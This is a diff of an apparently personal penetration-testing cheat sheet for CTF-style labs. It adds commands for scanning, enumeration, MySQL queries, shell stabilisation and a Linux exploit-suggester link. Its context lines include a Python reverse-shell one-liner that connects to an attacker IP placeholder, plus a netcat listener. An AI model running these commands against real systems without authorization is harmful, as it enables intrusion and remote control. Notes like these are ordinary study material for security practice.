@@ -28,6 +28,10 @@ nmap -sC -sV -p- -T4 --min-rate=[packet size] -vv [MACHINE IP]
 ```sh
  nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 <target-ip> >> vuln_plugin.txt
 ```
+- For Internal Ports
+```sh
+ss -tulpn
+```
 ### Directory Enumeration
 
 - #### **Gobuster**
@@ -106,6 +110,14 @@ gpg --decrypt <file name>
 
 ### Some Important commands
 
+- #### **Downloading everything from a directory**
+```sh
+wget -r http://<ip>:8008/
+```
+- #### **Copying Large text**
+```sh
+cat /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | xclip -selection clipboard
+```
 - #### **Finding file Type**
 ```sh
 file <filename>
@@ -161,6 +173,17 @@ ftp> get file.txt -
 ```sh
 curl -s http://(IP/URL)/ | grep hidden
 ```
+
+### MySQL Commands
+```sql
+show databases;
+use <db-name>;
+show tables;
+select * form <table-name>;
+
+update <table-name> set run = 1 ;
+
+```
 ### WebDav
 ```sh
 └─$ cadaver http://<target_ip>/webdav/
@@ -214,6 +237,7 @@ cat /var/log/apt/history.log | grep 'tool-name'
 ```py
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+- #### Exploit Suggestion : [les.sh](https://github.com/The-Z-Labs/linux-exploit-suggester)
 ## PrivEsc
 
 #### My Notes
@@ -229,7 +253,10 @@ find / -type f -perm -04000 -ls 2>/dev/null
 ```sh
 cat /etc/crontab 
 ```
-
+- #### Finding backdoors
+```sh
+curl localhost:8080
+```
 - #### Searching for `Bash History`
 ```sh
 ls -la /etc/cron.daily/
@@ -246,9 +273,10 @@ rlwrap nc -nlvp 4444
 ## Getting the terminal Shell
 - **Some time the terminal shell is not given then we have to do this!**
 ```sh
-python -c "import pty; pty.spawn('/bin/bash')"
-
-stty raw -echo
+python3 -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+Ctrl+Z
+stty raw -echo; fg
 ```
 ## Exploit for `wget`
 ```sh
